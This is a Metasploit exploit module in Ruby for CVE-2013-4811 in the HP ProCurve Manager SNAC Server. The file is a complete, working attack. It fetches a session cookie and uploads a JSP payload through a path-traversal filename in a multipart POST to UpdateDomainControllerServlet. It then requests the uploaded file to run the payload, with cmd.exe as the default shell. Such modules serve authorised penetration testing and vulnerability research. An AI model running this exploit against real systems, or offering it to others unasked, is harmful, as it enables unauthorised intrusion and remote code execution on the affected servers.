# frozen_string_literal: true
##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  HttpFingerprint = { pattern: [ /Apache-Coyote/ ] }.freeze

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
                      'Name'           => 'HP ProCurve Manager SNAC UpdateDomainControllerServlet File Upload',
                      'Description'    => %q(
                        This module exploits a path traversal flaw in the HP ProCurve Manager SNAC Server. The
                        vulnerability in the UpdateDomainControllerServlet allows an attacker to upload arbitrary
                        files, just having into account binary writes aren't allowed. Additionally, authentication
                        can be bypassed in order to upload the file. This module has been tested successfully on
                        the SNAC server installed with HP ProCurve Manager 4.0.
                      ),
                      'Author'         =>
                        [
                          'rgod <rgod[at]autistici.org>', # Vulnerability Discovery
                          'juan vazquez' # Metasploit module
                        ],
                      'License'        => MSF_LICENSE,
                      'References'     =>
                        [
                          [ 'CVE', '2013-4811' ],
                          [ 'OSVDB', '97154' ],
                          [ 'BID', '62349' ],
                          [ 'ZDI', '13-226' ]
                        ],
                      'Privileged'     => true,
                      'Platform'       => 'win',
                      'Arch'           => ARCH_JAVA,
                      'DefaultOptions' =>
                        {
                          'SHELL' => 'cmd.exe',
                          'SSL' => true
                        },
                      'Targets'        =>
                        [
                          [ 'HP ProCurve Manager 4.0 SNAC Server', {} ]
                        ],
                      'DefaultTarget'  => 0,
                      'DisclosureDate' => 'Sep 09 2013'))

    register_options(
      [
        Opt::RPORT(443)
      ], self.class
    )
  end

  def check
    session = get_session
    return Exploit::CheckCode::Safe if session.nil?

    res = send_request_cgi('uri' => "/RegWeb/RegWeb/GetDomainControllerServlet",
                           'cookie' => session)

    if res && (res.code == 200) && res.body =~ /domainName/
      return Exploit::CheckCode::Appears
    end

    Exploit::CheckCode::Safe
  end

  def get_session
    res = send_request_cgi('uri' => "/RegWeb/html/snac/index.html")
    session = nil
    session = res.get_cookies if res && (res.code == 200)

    return session if session && !session.empty?

    nil
  end

  def exploit_upload(session)
    jsp_name = "#{rand_text_alphanumeric(8 + rand(8))}.jsp"
    post_message = Rex::MIME::Message.new
    post_message.add_part(payload.encoded, "application/octet-stream", nil, "form-data; name=\"adCert\"; filename=\"\\../#{jsp_name}\"")
    post_message.add_part("{}", nil, nil, "form-data; name=\"ad_data\"")
    post_message.add_part("add", nil, nil, "form-data; name=\"ad_action\"")
    data = post_message.to_s

    res = send_request_cgi(
      'uri' => "/RegWeb/RegWeb/UpdateDomainControllerServlet",
      'method' => 'POST',
      'ctype' => "multipart/form-data; boundary=#{post_message.bound}",
      'cookie' => session,
      'data' => data
    )

    return jsp_name if res && (res.code == 200) && res.body =~ /success:false/

    nil
  end

  def exploit
    print_status("Getting a valid session...")
    session = get_session
    if session.nil?
      fail_with(Failure::NoTarget, "#{peer} - Failed to get a valid session")
    end

    print_status("Uploading payload...")
    jsp = exploit_upload(session)
    fail_with(Failure::NotVulnerable, "#{peer} - Upload failed") unless jsp

    print_status("Executing payload...")
    send_request_cgi('uri' => "/RegWeb/#{jsp}")
  end
end
